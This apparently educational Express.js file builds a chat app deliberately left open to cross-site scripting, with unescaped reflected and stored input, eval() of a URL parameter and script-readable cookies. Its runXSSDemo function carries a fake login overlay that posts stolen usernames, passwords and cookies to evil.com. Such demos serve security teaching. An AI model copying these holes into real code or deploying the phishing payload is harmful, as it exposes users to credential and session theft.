// server-unsafe.js
const express = require('express');
const app = express();
const PORT = 3000;

// NO CSP - VULNERABLE TO XSS
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// In-memory database (simulated)
let messages = [
    { id: 1, user: 'admin', text: 'Welcome to the chat!', safe: true },
    { id: 2, user: 'alice', text: 'Hello everyone!', safe: true }
];

let users = [
    { id: 1, username: 'alice', balance: 1000, email: 'alice@example.com' },
    { id: 2, username: 'bob', balance: 2500, email: 'bob@example.com' }
];

// Middleware to parse query params
app.use((req, res, next) => {
    // Simulate reflected XSS vulnerability
    if (req.query.error) {
        req.errorMessage = req.query.error;
    }
    if (req.query.search) {
        req.searchTerm = req.query.search;
    }
    next();
});

// Home page - VULNERABLE
app.get('/', (req, res) => {
    const errorDisplay = req.errorMessage ? 
        `<div class="error">Error: ${req.errorMessage}</div>` : '';
    
    const searchDisplay = req.searchTerm ?
        `<div class="search-results">Search results for: ${req.searchTerm}</div>` : '';
    
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Chat App (UNSAFE - No CSP)</title>
            <style>
                body { font-family: Arial; margin: 0; padding: 20px; background: #f5f5f5; }
                .container { max-width: 800px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                .danger { background: #ffebee; color: #c62828; padding: 15px; border-radius: 5px; margin-bottom: 20px; border-left: 4px solid #c62828; }
                .error { background: #ffebee; padding: 10px; border-radius: 5px; margin: 10px 0; color: #c62828; }
                .search-results { background: #e3f2fd; padding: 10px; border-radius: 5px; margin: 10px 0; }
                .chat-box { border: 1px solid #ddd; padding: 15px; height: 300px; overflow-y: auto; margin: 20px 0; background: #fafafa; }
                .message { padding: 8px; margin: 5px 0; background: white; border-radius: 5px; border-left: 3px solid #2196f3; }
                .message.admin { border-left-color: #4caf50; }
                .message.user { border-left-color: #ff9800; }
                input, textarea, button { padding: 10px; margin: 5px 0; width: 100%; box-sizing: border-box; }
                button { background: #2196f3; color: white; border: none; cursor: pointer; }
                button:hover { background: #1976d2; }
                .user-card { background: #e8f5e9; padding: 15px; border-radius: 5px; margin: 10px 0; }
                .balance { color: #2e7d32; font-weight: bold; }
                .xss-demo { background: #fff3cd; padding: 15px; border-radius: 5px; margin: 20px 0; }
                h1 { color: #d32f2f; }
                .security-status { background: #ffebee; padding: 15px; border-radius: 5px; margin: 20px 0; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>💀 Chat Application (UNSAFE)</h1>
                
                <div class="danger">
                    ⚠️ <strong>CRITICAL VULNERABILITY:</strong> No Content Security Policy<br>
                    This application is vulnerable to Cross-Site Scripting (XSS) attacks
                </div>
                
                ${errorDisplay}
                ${searchDisplay}
                
                <div class="security-status">
                    <h3>🔓 Security Headers Status</h3>
                    <p><strong>Content-Security-Policy:</strong> ❌ NOT SET</p>
                    <p><strong>X-XSS-Protection:</strong> ❌ NOT SET</p>
                    <p><strong>X-Content-Type-Options:</strong> ❌ NOT SET</p>
                    <p><strong>Risk Level:</strong> 🔴 CRITICAL</p>
                </div>
                
                <h2>💬 Live Chat</h2>
                <div class="chat-box" id="chatBox">
                    ${messages.map(msg => `
                        <div class="message ${msg.user === 'admin' ? 'admin' : 'user'}">
                            <strong>${msg.user}:</strong> ${msg.text}
                        </div>
                    `).join('')}
                </div>
                
                <form action="/post-message" method="POST" id="messageForm">
                    <input type="text" name="user" placeholder="Your name" required>
                    <textarea name="message" placeholder="Your message" rows="3" required></textarea>
                    <button type="submit">Post Message</button>
                </form>
                
                <h2>👥 User Profiles</h2>
                <div id="userProfiles">
                    ${users.map(user => `
                        <div class="user-card">
                            <h3>${user.username}</h3>
                            <p>Balance: <span class="balance">$${user.balance}</span></p>
                            <p>Email: ${user.email}</p>
                            <button onclick="showUserDetails(${user.id})">View Details</button>
                        </div>
                    `).join('')}
                </div>
            </div>
            
            <script>
                // VULNERABLE: Direct DOM manipulation without sanitization
                document.getElementById('messageForm').addEventListener('submit', function(e) {
                    e.preventDefault();
                    const formData = new FormData(this);
                    const user = formData.get('user');
                    const message = formData.get('message');
                    
                    // UNSAFE: Directly injecting user input into HTML
                    const chatBox = document.getElementById('chatBox');
                    chatBox.innerHTML += \`
                        <div class="message user">
                            <strong>\${user}:</strong> \${message}
                        </div>
                    \`;
                    
                    // Clear form
                    this.reset();
                });
                
                // VULNERABLE: Insecure user details display
                function showUserDetails(userId) {
                    const details = {
                        1: { username: 'alice', fullName: 'Alice Johnson', ssn: '123-45-6789', phone: '555-0123' },
                        2: { username: 'bob', fullName: 'Bob Smith', ssn: '987-65-4321', phone: '555-9876' }
                    };
                    
                    const userInfo = details[userId];
                    // UNSAFE: Alert with unsanitized data (XSS through JavaScript)
                    alert(\`User Details:\\nName: \${userInfo.fullName}\\nSSN: \${userInfo.ssn}\\nPhone: \${userInfo.phone}\`);
                }
                
                // XSS Demo function
                function runXSSDemo() {
                    // Create malicious script injection
                    const maliciousScript = document.createElement('script');
                    maliciousScript.textContent = \`
                        // Steal cookies
                        alert('Cookie theft demo: ' + document.cookie);
                        
                        // Create fake login form
                        const fakeForm = document.createElement('div');
                        fakeForm.innerHTML = \`
                            <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;display:flex;justify-content:center;align-items:center;">
                                <div style="background:white;padding:30px;border-radius:10px;width:300px;">
                                    <h2 style="color:red;">⚠️ Security Alert</h2>
                                    <p>Your session has expired. Please re-login:</p>
                                    <input type="text" id="fakeUsername" placeholder="Username" style="width:100%;padding:10px;margin:5px 0;"><br>
                                    <input type="password" id="fakePassword" placeholder="Password" style="width:100%;padding:10px;margin:5px 0;"><br>
                                    <button onclick="stealCredentials()" style="width:100%;padding:10px;background:red;color:white;border:none;">Login</button>
                                </div>
                            </div>
                        \`;
                        document.body.appendChild(fakeForm);
                        
                        function stealCredentials() {
                            const username = document.getElementById('fakeUsername').value;
                            const password = document.getElementById('fakePassword').value;
                            alert('Credentials stolen: ' + username + ':' + password);
                            fetch('https://evil.com/steal', {
                                method: 'POST',
                                body: JSON.stringify({user: username, pass: password, cookie: document.cookie})
                            });
                            fakeForm.remove();
                        }
                    \`;
                    document.body.appendChild(maliciousScript);
                }
                
                // VULNERABLE: Load external scripts without validation
                function loadExternalWidget() {
                    const script = document.createElement('script');
                    script.src = 'https://untrusted-cdn.com/widget.js';
                    document.head.appendChild(script);
                }
                
                // Check for XSS attempts in URL
                const urlParams = new URLSearchParams(window.location.search);
                const xssParam = urlParams.get('xss');
                if (xssParam) {
                    // VULNERABLE: Direct execution of URL parameter
                    try {
                        eval(xssParam);
                    } catch(e) {
                        console.error('XSS payload failed:', e);
                    }
                }
            </script>
        </body>
        </html>
    `);
});

// API endpoints - UNSAFE
app.post('/post-message', (req, res) => {
    const { user, message } = req.body;
    const newMessage = {
        id: messages.length + 1,
        user: user,
        text: message,
        safe: false  // Not sanitized!
    };
    messages.push(newMessage);
    res.redirect('/');
});

// User search with reflected XSS
app.get('/search', (req, res) => {
    const query = req.query.q || '';
    res.send(`
        <html>
        <body>
            <h1>Search Results</h1>
            <p>You searched for: ${query}</p>
            <a href="/">Back</a>
        </body>
        </html>
    `);
});

// Profile endpoint with XSS
app.get('/profile/:username', (req, res) => {
    const username = req.params.username;
    res.send(`
        <html>
        <body>
            <h1>Profile: ${username}</h1>
            <div>Welcome ${username}!</div>
            <a href="/">Back</a>
        </body>
        </html>
    `);
});

// JSON API without proper headers
app.get('/api/users', (req, res) => {
    res.json(users);
});

// Cookie endpoint (for stealing demo)
app.get('/set-cookie', (req, res) => {
    res.cookie('sessionId', 'secret-session-12345', { httpOnly: false }); // httpOnly should be true!
    res.cookie('userToken', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9', { httpOnly: false });
    res.redirect('/');
});

app.listen(PORT, () => {
    console.log(`🚨 UNSAFE Server running on http://localhost:${PORT}`);
    console.log(`❌ NO CSP - Vulnerable to XSS attacks`);
});